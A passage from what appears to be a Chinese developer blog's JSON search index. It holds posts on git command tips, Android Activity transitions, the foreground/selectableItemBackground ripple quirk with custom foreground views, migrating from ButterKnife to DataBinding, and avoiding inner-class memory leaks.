–depth=50 –branch=branchName https://github.com/XXX/XXX.git myFolder/theNameIwantItToBe git -c core.quotepath=false push –progress –porcelain origin refs/heads/master:master // idea内置git push操作实际执行了这一行指令 git fetch -v git submodule update –init ## 比如说shadowsocks工程 我也是才发现，windows下的git bash集成了openssh，curl，好用的不行 git branch -r 有时候不显示所有的remote branch，亲测，remove掉origin，重新添加然后fetch就好了 git 统计commiter人数 git log –pretty=’%aN’ | sort -u | wc -lgit log –oneline | wc -l ### 提交总数统计git log –pretty=’%aN’ | sort | uniq -c | sort -k1 -n -r | head -n 5 ###查看仓库提交者排名前 5 查看最近一次commit都改了什么 git diff HEAD~1 HEAD git log git log –pretty=format:”%cn committed %h on %cd”git log –onelinegit log –stat ## 显示出每一次commit的，以及每一次commit都改了哪些文件git log -v ##这个更啰嗦 ## 比stat多出了每次更改之后修改的文件内容git log –graph –oneline –decorategit log –pretty=format:”%cn committed %h on %cd” | awk ‘{ print $8}’ | sort -n ##结合awk可以看到最晚几点commit，比如凌晨1点还在commit的.format里面的参数在man git log page可以找到git log –after=”2014-7-1” –before=”2014-7-4” ## 还可以查看某个日期之间提交的东西git log –author=”John”git log –author=”John|Mary” ## John或者Mary的git log –grep=”JRA-224:” ## 从commit message里面查找git log – foo.py bar.py ## 查看跟这几个文件相关的操作记录git log -S”Hello, World!” ##这个等于查找git log -p里面哪一次提交添加了“Hello, World！”这句话git log –no-mergesgit log –mergesgit log –pretty=format:”%h%x09%an%x09%ad%x09%s” //非常简明的一行显示 Reference git reset和revert git recipes git merge –no-ff advanced git techniques","tags":[{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"},{"name":"git","slug":"git","permalink":"https://haldir65.github.io/tags/git/"}]},{"title":"activity transition pre and post lollipop","date":"2016-09-27T14:53:25.000Z","path":"2016/09/27/activity-transition-pre-and-post-lollipop/","text":"Lollipop开始引入了新的Activity Transition动画效果，比起常用的overridePendingTransaction() 效果要强大许多 测试环境supportLibVersion = “24.2.1”gradle plugin version : “classpath ‘com.android.tools.build:gradle:2.2.0’”gradle version : 3.1compileSdkVersion 24buildToolsVersion “24.0.2” 常规用法: A activity &gt;&gt;&gt;&gt; B activity A activity中: intent = new Intent(getActivity(), PictureDetailSubActivity2.class); intent.putExtra(EXTRA_IMAGE_URL, R.drawable.b2); intent.putExtra(EXTRA_IMAGE_TITLE, &quot;使用ActivityCompat动画&quot;); ActivityOptionsCompat optionsCompat = ActivityOptionsCompat. makeSceneTransitionAnimation(getActivity(), view, TRANSIT_PIC); try { ActivityCompat.startActivity(getActivity(), intent, optionsCompat.toBundle()); //据说部分三星手机上会失效 } catch (Exception e) { e.printStackTrace(); ToastUtils.showTextShort(getActivity(), &quot;ActivityCompat出错！！&quot;); startActivity(intent); } Pair这个class是v4包里的一个Util类，用来装载一组(pair)对象，支持泛型，很好用。由于都是v4包里的方法，省去了做API版本判断，在API 16以下，就只会调用普通的startActivity方法。上面加了try catch是避免部分手机上出现问题 B activity中onCreate调用 ViewCompat.setTransitionName(binding.imageDetail, TRANSIT_PIC); 就可实现普通的转场动画。 兼容方式(将连续的Transition带到API16以下) 主要的原理: 在A activity中记录要带到B activity中的View的当前位置，在B activity中添加onPredrawListener(measure完毕，layout完毕，即将开始Draw的时候)，此时开始进行动画，将SharedView从原位置animate到B Activty中的位置 原理及详细代码在这里: Dev Bytes Activity Animations Youtube 我照着写了一些关于Activity Transition的模板，gitHub 基本能实现兼容到API 16以下的效果 最后是这几天遇到的天坑 @Override public void onCreate(Bundle savedInstanceState, PersistableBundle persistentState) { super.onCreate(savedInstanceState, persistentState); } 这样的Activity绝对会出ClassNotFoundException , 而且并不会主动出现在logcat中 overridePendingTransaction要在startActivity以及finish之后才能调用 gitHub上有一个比较好的兼容库，大致原理也是使用onPreDrawListener","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"transition","slug":"transition","permalink":"https://haldir65.github.io/tags/transition/"}]},{"title":"android使用selectableItemBackground的一些坑","date":"2016-09-23T19:56:39.000Z","path":"2016/09/23/selectableItemBackground-foreground/","text":"android:foreground=”?android:attr/selectableItemBackground” 或是 android:background=”?android:attr/selectableItemBackground” 这个xml属性最早是我学着写recyclerVeiw的item xml的时候接触到的，简单来说就是，在API 21及以上，用户点击这个itemView时候会出现一个Ripple效果非常好看，而在API 21以下则会表现为MonoChrome的类似按压色的效果 而这个点击时的水波纹颜色也是可以Customize的 &lt;item name=&quot;android:colorControlHighlight&quot;&gt;@color/my_ripple_color&lt;/item&gt; //这个要写在自己的Activity的Theme(style-v21)里，注意，当前Activity的Theme必须继承自Appcompat!!于是，我写了这样的xml &lt;LinearLayout android:id=&quot;@+id/item_root&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;?android:attr/listPreferredItemHeight&quot; android:orientation=&quot;vertical&quot; android:gravity=&quot;center&quot; android:onClick=&quot;@{(view) -&gt; callback.onClick(view,data)}&quot; android:elevation=&quot;2dp&quot; android:background=&quot;@color/md_amber_200&quot; android:foreground=&quot;?android:attr/selectableItemBackground&quot; /&gt; 然而，点击之后并没有出现水波纹(模拟器 API 21)，换成CardView或是将foreground改为background之后才有效。查了很多博客，最后得出结论:android:foreground在API 23之前只对FrameLayout有效(CardView继承自FrameLayout当然有效)。 ##所以正确的做法是 android:foreground=”?android:attr/selectableItemBackground” 改为 android:background=”?android:attr/selectableItemBackground” 或者使用FrameLayout。 关于foreground之前看google io2016时，Chris Banes给了这样的解释。,android:foreground在API 1 的FrameLayout中就有了，但直到API 23才将这个属性添加到View中。所以，换成API 23的手机上面那段代码foreground也是可以出现Ripple的,至于23之前为什么foreground无效，并不清楚为什么 首先是一种简单的模拟这种视觉效果的尝试：如何创建兼容的Forefround drawable selector 这篇文章提到了: 简单来讲，Foreground 定义了绘制于当前内容之上的 Drawable，类似一层覆盖物。所以我们可以为设置 Foreground 的值为 drawable或者color， 那如果将 Froeground 设置为 drawable selector，自然就可以为控件实现点击响应效果了。 比较奇怪的是在 sdk 23 以前，foregrond 属性只对 Framelayout 生效，但这个问题现在得到了解决，所以也请确保你的 compileSdkVersion 大于等于23 这篇文章的做法是针对21以下的版本使用slelector Drawable实现类似的效果 如何真正实现为API23之前的View,ViewGroup添加foreground?随后我找到了这篇博客，具体的逻辑并不太多。这里插一句，任何Drawable对象，在你调用setDrawable之后，该Drawable都会保留一个最后一个调用对象的callback Drawable-&gt;View-&gt;Context //leak!//所以Drawable也有可能导致Activity leak 随后我发现了更多有意思的讨论首先是Chris Banes在G+上的Post : Foreground Doge他给出了两种方案,Chris作为Google员工，给出的解决方案应该是比较官方的了 如果想利用FrameLayout的foreground特性来实现点击特效的话，完全可以在自己的xml外面再包裹一层FrameLayout 自己动手写一个实现foreground的Viewgroup , 代码 attrs:```&lt;?xml version=”1.0” encoding=”utf-8”?&gt; &lt;attr name=&quot;android:foreground&quot; /&gt; &lt;attr name=&quot;android:foregroundInsidePadding&quot; /&gt; &lt;attr name=&quot;android:foregroundGravity&quot; /&gt; ``` package your.package; import android.content.Context; import android.content.res.TypedArray; import android.graphics.Canvas; import android.graphics.Rect; import android.graphics.drawable.Drawable; import android.util.AttributeSet; import android.view.Gravity; import android.widget.LinearLayout; import your.package.R; public class ForegroundLinearLayout extends LinearLayout { private Drawable mForeground; private final Rect mSelfBounds = new Rect(); private final Rect mOverlayBounds = new Rect(); private int mForegroundGravity = Gravity.FILL; protected boolean mForegroundInPadding = true; boolean mForegroundBoundsChanged = false; public ForegroundLinearLayout(Context context) { super(context); } public ForegroundLinearLayout(Context context, AttributeSet attrs) { this(context, attrs, 0); } public ForegroundLinearLayout(Context context, AttributeSet attrs, int defStyle) { super(context, attrs, defStyle); TypedArray a = context.obtainStyledAttributes(attrs, R.styleable.ForegroundLinearLayout, defStyle, 0); mForegroundGravity = a.getInt( R.styleable.ForegroundLinearLayout_android_foregroundGravity, mForegroundGravity); final Drawable d = a.getDrawable(R.styleable.ForegroundLinearLayout_android_foreground); if (d != null) { setForeground(d); } mForegroundInPadding = a.getBoolean( R.styleable.ForegroundLinearLayout_android_foregroundInsidePadding, true); a.recycle(); } /** * Describes how the foreground is positioned. * * @return foreground gravity. * * @see #setForegroundGravity(int) */ public int getForegroundGravity() { return mForegroundGravity; } /** * Describes how the foreground is positioned. Defaults to START and TOP. * * @param foregroundGravity See {@link android.view.Gravity} * * @see #getForegroundGravity() */ public void setForegroundGravity(int foregroundGravity) { if (mForegroundGravity != foregroundGravity) { if ((foregroundGravity &amp; Gravity.RELATIVE_HORIZONTAL_GRAVITY_MASK) == 0) { foregroundGravity |= Gravity.START; } if ((foregroundGravity &amp; Gravity.VERTICAL_GRAVITY_MASK) == 0) { foregroundGravity |= Gravity.TOP; } mForegroundGravity = foregroundGravity; if (mForegroundGravity == Gravity.FILL &amp;&amp; mForeground != null) { Rect padding = new Rect(); mForeground.getPadding(padding); } requestLayout(); } } @Override protected boolean verifyDrawable(Drawable who) { return super.verifyDrawable(who) || (who == mForeground); } @Override public void jumpDrawablesToCurrentState() { super.jumpDrawablesToCurrentState(); if (mForeground != null) mForeground.jumpToCurrentState(); } @Override protected void drawableStateChanged() { super.drawableStateChanged(); if (mForeground != null &amp;&amp; mForeground.isStateful()) { mForeground.setState(getDrawableState()); } } /** * Supply a Drawable that is to be rendered on top of all of the child * views in the frame layout. Any padding in the Drawable will be taken * into account by ensuring that the children are inset to be placed * inside of the padding area. * * @param drawable The Drawable to be drawn on top of the children. */ public void setForeground(Drawable drawable) { if (mForeground != drawable) { if (mForeground != null) { mForeground.setCallback(null); unscheduleDrawable(mForeground); } mForeground = drawable; if (drawable != null) { setWillNotDraw(false); drawable.setCallback(this); if (drawable.isStateful()) { drawable.setState(getDrawableState()); } if (mForegroundGravity == Gravity.FILL) { Rect padding = new Rect(); drawable.getPadding(padding); } } else { setWillNotDraw(true); } requestLayout(); invalidate(); } } /** * Returns the drawable used as the foreground of this FrameLayout. The * foreground drawable, if non-null, is always drawn on top of the children. * * @return A Drawable or null if no foreground was set. */ public Drawable getForeground() { return mForeground; } @Override protected void onLayout(boolean changed, int left, int top, int right, int bottom) { super.onLayout(changed, left, top, right, bottom); mForegroundBoundsChanged = changed; } @Override protected void onSizeChanged(int w, int h, int oldw, int oldh) { super.onSizeChanged(w, h, oldw, oldh); mForegroundBoundsChanged = true; } @Override public void draw(Canvas canvas) { super.draw(canvas); if (mForeground != null) { final Drawable foreground = mForeground; if (mForegroundBoundsChanged) { mForegroundBoundsChanged = false; final Rect selfBounds = mSelfBounds; final Rect overlayBounds = mOverlayBounds; final int w = getRight() - getLeft(); final int h = getBottom() - getTop(); if (mForegroundInPadding) { selfBounds.set(0, 0, w, h); } else { selfBounds.set(getPaddingLeft(), getPaddingTop(), w - getPaddingRight(), h - getPaddingBottom()); } Gravity.apply(mForegroundGravity, foreground.getIntrinsicWidth(), foreground.getIntrinsicHeight(), selfBounds, overlayBounds); foreground.setBounds(overlayBounds); } foreground.draw(canvas); } } } 使用方式 &lt;your.package.ForegroundLinearLayout android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:foreground=&quot;?android:selectableItemBackground&quot;&gt; &lt;ImageView android:id=”@+id/imageview_opaque” android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; /&gt; ... other views ... /&gt; 接着是Jack Wharton的ForegroundImageView attrs &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;resources&gt; &lt;declare-styleable name=&quot;ForegroundImageView&quot;&gt; &lt;attr name=&quot;android:foreground&quot;/&gt; &lt;/declare-styleable&gt; &lt;/resources&gt; import android.content.Context; import android.content.res.TypedArray; import android.graphics.Canvas; import android.graphics.drawable.Drawable; import android.util.AttributeSet; import android.widget.ImageView; public class ForegroundImageView extends ImageView { private Drawable foreground; public ForegroundImageView(Context context) { this(context, null); } public ForegroundImageView(Context context, AttributeSet attrs) { super(context, attrs); TypedArray a = context.obtainStyledAttributes(attrs, R.styleable.ForegroundImageView); Drawable foreground = a.getDrawable(R.styleable.ForegroundImageView_android_foreground); if (foreground != null) { setForeground(foreground); } a.recycle(); } /** * Supply a drawable resource that is to be rendered on top of all of the child * views in the frame layout. * * @param drawableResId The drawable resource to be drawn on top of the children. */ public void setForegroundResource(int drawableResId) { setForeground(getContext().getResources().getDrawable(drawableResId)); } /** * Supply a Drawable that is to be rendered on top of all of the child * views in the frame layout. * * @param drawable The Drawable to be drawn on top of the children. */ public void setForeground(Drawable drawable) { if (foreground == drawable) { return; } if (foreground != null) { foreground.setCallback(null); unscheduleDrawable(foreground); } foreground = drawable; if (drawable != null) { drawable.setCallback(this); if (drawable.isStateful()) { drawable.setState(getDrawableState()); } } requestLayout(); invalidate(); } @Override protected boolean verifyDrawable(Drawable who) { return super.verifyDrawable(who) || who == foreground; } @Override public void jumpDrawablesToCurrentState() { super.jumpDrawablesToCurrentState(); if (foreground != null) foreground.jumpToCurrentState(); } @Override protected void drawableStateChanged() { super.drawableStateChanged(); if (foreground != null &amp;&amp; foreground.isStateful()) { foreground.setState(getDrawableState()); } } @Override protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) { super.onMeasure(widthMeasureSpec, heightMeasureSpec); if (foreground != null) { foreground.setBounds(0, 0, getMeasuredWidth(), getMeasuredHeight()); invalidate(); } } @Override protected void onSizeChanged(int w, int h, int oldw, int oldh) { super.onSizeChanged(w, h, oldw, oldh); if (foreground != null) { foreground.setBounds(0, 0, w, h); invalidate(); } } @Override public void draw(Canvas canvas) { super.draw(canvas); if (foreground != null) { foreground.draw(canvas); } } } 最后，还有人给出据说更好的解决方案没有测试过，不了解 reference Android themes and styles demisfied 关于Theme和Style的区别的很好的学习资料 Chris Banes G+ post 评论很精彩 RelativeLayout with foreGround 没测试过 Ripple Effect 将Ripple的动画兼容到API 9+ ，很出色的一个库。之前项目中用过，就是一个继承自RelativeLayout的自定义ViewGroup。","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"foreground","slug":"foreground","permalink":"https://haldir65.github.io/tags/foreground/"}]},{"title":"replace butterKnife with databinding","date":"2016-09-22T15:17:39.000Z","path":"2016/09/22/replace-butterKnife-with-databinding/","text":"Yigit Boyar 在2015年的android Dev summit上介绍了Databinding，当时好像提到一句:“no binding libraries will be created from now on “，大意如此。本文介绍使用Databinding替代ButterKnife的用法 本文大部分代码来自网络，我只是觉得简单的代码直接复制粘贴可能会比较好。 1.在Activity中使用before class ExampleActivity extends Activity { @Bind(R.id.title) TextView title; @Bind(R.id.subtitle) TextView subtitle; @Bind(R.id.footer) TextView footer; @Override public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.simple_activity); ButterKnife.bind(this); } } after首先需要将xml文件添加 Layout tagR.layout.smple_activity &lt;layout&gt; &lt;LinearLayout&gt; &lt;TextView android:id=&quot;@+id/title&quot;&gt; &lt;TextView android:id=&quot;@+id/subtitle&quot;&gt; &lt;TextView android:id=&quot;@+id/footer&quot;&gt; &lt;/LinearLayout&gt; &lt;/layout&gt; class ExampleActivity extends Activity { private ActivitySampleBinding binding; @Override public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = DataBindingUtils.setContentView(this, R.layout.simple_activity); binding.title.setText(&quot;I am Title&quot;); //no more findViewById!!! } } 2.在Fragment中使用before public class FancyFragment extends Fragment { @Bind(R.id.button1) Button button1; @Bind(R.id.button2) Button button2; @Override public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) { View view = inflater.inflate(R.layout.fancy_fragment, container, false); ButterKnife.bind(this, view); // TODO Use fields... return view; } } after public class FancyFragment extends Fragment { private FragmentFancyBinding binding; @Override public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) { binding = DataBindingUtil.inflate(inflater,R.layout.fragment_fancy, container, false); return binding.getRoot(); } } 3.在ViewHolder中使用before public class MyAdapter extends BaseAdapter { @Override public View getView(int position, View view, ViewGroup parent) { ViewHolder holder; if (view != null) { holder = (ViewHolder) view.getTag(); } else { view = inflater.inflate(R.layout.list_item_sample, parent, false); holder = new ViewHolder(view); view.setTag(holder); } holder.name.setText(&quot;John Doe&quot;); // etc... return view; } static class ViewHolder { @Bind(R.id.title) TextView name; @Bind(R.id.job_title) TextView jobTitle; public ViewHolder(View view) { ButterKnife.bind(this, view); } } } after ListViewpublic class MyAdapter extends BaseAdapter { @Override public View getView(int position, View convertView, ViewGroup parent) { ListItemSampleBinding binding; if (convertView == null) { binding = DataBindingUtil.inflate(inflater, R.layout.list_item_sample, parent, false); convertView = binding.getRoot(); convertView.setTag(binding); } else { binding = (ListItemSampleBinding) convertView.getTag(); } binding.setUser(getItem(position)); // binding.name.setText(&quot;John Doe&quot;); return convertView; } } recyclerViewpublic class SampleRecyclerAdapter extends RecyclerView.Adapter&lt;SampleRecyclerAdapter.BindingHolder&gt; { @Override public RegisterableDeviceListAdapter.ViewHolder onCreateViewHolder(ViewGroup parent, int viewType) { final View v = LayoutInflater.from(parent.getContext()).inflate(R.layout.list_item_sample, parent, false); return new BindingHolder(v); } @Override public void onBindViewHolder(BindingHolder holder, int position) { holder.getBinding().setVariable(BR.user, getItem(position)); } static class BindingHolder extends RecyclerView.ViewHolder { private final ViewDataBinding binding; public BindingHolder(View itemView) { super(itemView); binding = DataBindingUtil.bind(itemView) } public ViewDataBinding getBinding() { return binding; } } } 4.在CustomView中使用在自定义View(ViewGroup)的时候，可以用ButterKnife减少自定义ViewGroup中的findViewById,使用Databinding之后是这样的。 public class Pagination extends RelativeLayout { private ViewPaginationBinding binding; public Pagination(Context context) { this(context, null); } public Pagination(Context context, AttributeSet attrs) { super(context, attrs); binding = DataBindingUtil.inflate(LayoutInflater.from(context), R.layout.view_pagination, this, true); } public static void setListener(Pagination paginate, View target, OnPaginationClickListener listener) { if (listener != null) { target.setOnClickListener(_v -&gt; listener.onClick(paginate)); } } @BindingAdapter({&quot;android:onPrevButtonClicked&quot;}) public static void setPrevClickListener(Pagination view, OnPaginationClickListener listener) { setListener(view, view.binding.btnPrevPage, listener); } @BindingAdapter({&quot;android:onNextButtonClicked&quot;}) public static void setNextClickListener(Pagination view, OnPaginationClickListener listener) { setListener(view, view.binding.btnNextPage, listener); } public interface OnPaginationClickListener { void onClick(Pagination pagination); } } 5.EventHandler, setDefaultComponent…Databinding还有很多高级用法，目前给我带来的好处就是明显减少了boilerplate code So ,感谢ButterKnife给我们带来的便利，Googbye ButterKnife，Hello DataBinding! ＊todo＊ ### how did ButterKnife work?ButterKnife原理基本上从ButterKnifeAnnotationProcess.process开始 Reference Data Binding Library data-binding-android-boyar-mount Advanced Data Bindinding Two-Way Data Binding at google io 2016 Android Dev Summit 2015 Goodbye Butter Knife Google Sample","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"databinding","slug":"databinding","permalink":"https://haldir65.github.io/tags/databinding/"},{"name":"Butterknife","slug":"Butterknife","permalink":"https://haldir65.github.io/tags/Butterknife/"}]},{"title":"android内部类导致leak模板","date":"2016-09-18T10:23:42.000Z","path":"2016/09/18/android-inner-class-leak/","text":"通常我们在一个class里面写内部类时，不是一定要用static声明为静态类，但是推荐作为内部静态类，因为内部类会隐式持有外部类的引用，有些时候如果代码处理不对容易造成内存泄漏下面就是个内存泄漏的例子 public class MainActivity extends Activity { public class MyHandler extends Handler{ @Override public void handleMessage(Message msg) { if(msg.what==1){ new Thread(){ @Override public void run() { while(true){ //do something } } }.start(); } } } public MyHandler handler; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); //... handler.sendEmptyMessage(1); finish(); } } 如上面代码所示，在onCreate方法里发送了一条消息给handler处理然后finish方法关闭activity，但是代码并不能如愿，因为在handler收到消息启动了一个线程并且是死循环，这时候Thread持有handler的引用，而handler又持有activity的引用，这就导致了handler不能回收和activty也不能回收，所以推荐使用静态内部类，因为静态内部类不持有外部类的引用，可以避免这些不必要的麻烦。 除此之外，在Activity里面创建一个AsyncTask的子类也容易导致leak例如 stackoverFlow上的这个问题 对于这类问题的比较常用的方式:WeakReference例如,写这样一个的静态内部类 private static class IncomingHandler extends Handler { private final WeakReference&lt;MessagingService&gt; mReference; IncomingHandler(MessagingService service) { mReference = new WeakReference&lt;&gt;(service); } @Override public void handleMessage(Message msg) { MessagingService service = mReference.get(); switch (msg.what) { case MSG_SEND_NOTIFICATION: int howManyConversations = msg.arg1 &lt;= 0 ? 1 : msg.arg1; int messagesPerConversation = msg.arg2 &lt;= 0 ? 1 : msg.arg2; if (service != null) { service.sendNotification(howManyConversations, messagesPerConversation); } break; default: super.handleMessage(msg); } } } //handler通过弱引用持有service对象，外加static内部类不持有外部类引用，应该不会leak了","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]}]